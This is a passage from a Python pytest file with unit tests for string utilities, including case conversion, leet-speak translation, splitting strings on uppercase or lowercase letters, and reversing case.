    assert camel_case('test ing foo bar') == 'testIngFooBar'


def test_pascal_case_1():
    assert pascal_case('test ing foo bar') == 'TestIngFooBar'


def test_unicode_number_to_character_1():
    assert unicode_number_to_character(65) == 'A'
    assert unicode_number_to_character(94) == '^'


def test_lowercase_first_letter_1():
    assert lowercase_first_letter('Atest') == 'atest'
    assert lowercase_first_letter('ATeSt') == 'aTeSt'


def test_uppercase_first_letter_1():
    assert uppercase_first_letter('atest') == 'Atest'
    assert uppercase_first_letter('aTeSt') == 'ATeSt'


def test_text_to_leet_speak():
    assert text_to_leet_speak('elite') == '3l1t3'
    assert text_to_leet_speak('foo bar') == 'f00 b4r'


def test_leet_speak_to_text():
    assert leet_speak_to_text('f00 b4r') == 'foo bar'
    assert leet_speak_to_text('3l1t3') == 'elite'


def test_string_split_on_uppercase_systematic():
    s = 'Abc'
    assert string_split_on_uppercase(s) == ['bc']

    s = 'aBc'
    assert string_split_on_uppercase(s) == ['a', 'c']

    s = 'abC'
    assert string_split_on_uppercase(s) == ['ab']

    s = 'ABc'
    assert string_split_on_uppercase(s) == ['c']

    s = 'AbC'
    assert string_split_on_uppercase(s) == ['b']

    s = 'Abc'
    assert string_split_on_uppercase(s, include_uppercase_characters=True) == ['Abc']

    s = 'aBc'
    assert string_split_on_uppercase(s, include_uppercase_characters=True) == ['a', 'Bc']

    s = 'abC'
    assert string_split_on_uppercase(s, include_uppercase_characters=True) == ['ab', 'C']

    s = 'ABc'
    assert string_split_on_uppercase(s, include_uppercase_characters=True) == ['A', 'Bc']

    s = 'AbC'
    assert string_split_on_uppercase(s, include_uppercase_characters=True) == ['Ab', 'C']

    s = 'ABc'
    assert string_split_on_uppercase(s, include_uppercase_characters=True, split_acronyms=False) == ['ABc']

    s = 'AbC'
    assert string_split_on_uppercase(s, include_uppercase_characters=True, split_acronyms=False) == ['Ab', 'C']

    s = 'aBC'
    assert string_split_on_uppercase(s, include_uppercase_characters=True, split_acronyms=False) == ['a', 'BC']

    with pytest.raises(ValueError):
        # try an invalid combination of kwargs
        string_split_on_uppercase(s, include_uppercase_characters=False, split_acronyms=False) == ['a', 'BC']


def test_string_split_on_uppercase_1():
    s = 'fooBarTest'
    assert string_split_on_uppercase(s) == ['foo', 'ar', 'est']

    s = 'This is a test'
    assert string_split_on_uppercase(s) == ['his is a test']

    s = 'This is a Test'
    assert string_split_on_uppercase(s) == ['his is a ', 'est']

    s = 'FoobaR'
    assert string_split_on_uppercase(s) == ['ooba']


def test_string_split_on_uppercase_including_uppercase_characters():
    s = 'fooBarTest'
    assert string_split_on_uppercase(s, include_uppercase_characters=True) == ['foo', 'Bar', 'Test']

    s = 'This is a test'
    assert string_split_on_uppercase(s, include_uppercase_characters=True) == ['This is a test']

    s = 'This is a Test'
    assert string_split_on_uppercase(s, include_uppercase_characters=True) == ['This is a ', 'Test']

    s = 'FoobaR'
    assert string_split_on_uppercase(s, include_uppercase_characters=True) == ['Fooba', 'R']


def test_string_split_on_lowercase_1():
    s = 'FOObARtEST'
    assert string_split_on_lowercase(s) == ['FOO', 'AR', 'EST']

    s = 'tHIS IS A TEST'
    assert string_split_on_lowercase(s) == ['HIS IS A TEST']

    s = 'tHIS IS A tEST'
    assert string_split_on_lowercase(s) == ['HIS IS A ', 'EST']

    s = 'fOOBAr'
    assert string_split_on_lowercase(s) == ['OOBA']


def test_string_split_on_lowercase_2():
    s = 'FOObARtEST'
    assert string_split_on_lowercase(s, include_lowercase_characters=True) == ['FOO', 'bAR', 'tEST']

    s = 'tHIS IS A TEST'
    assert string_split_on_lowercase(s, include_lowercase_characters=True) == ['tHIS IS A TEST']

    s = 'tHIS IS A tEST'
    assert string_split_on_lowercase(s, include_lowercase_characters=True) == ['tHIS IS A ', 'tEST']

    s = 'fOOBAr'
    assert string_split_on_lowercase(s, include_lowercase_characters=True) == ['fOOBA', 'r']


def test_string_reverse_case_1():
    assert string_reverse_case('fooBarTest') == 'FOObARtEST'
    assert string_reverse_case('This is a test') == 'tHIS IS A TEST'
    assert string_reverse_case('This is a Test') == 'tHIS IS A tEST'
    assert string_reverse_case('FoobaR') == 'fOOBAr'
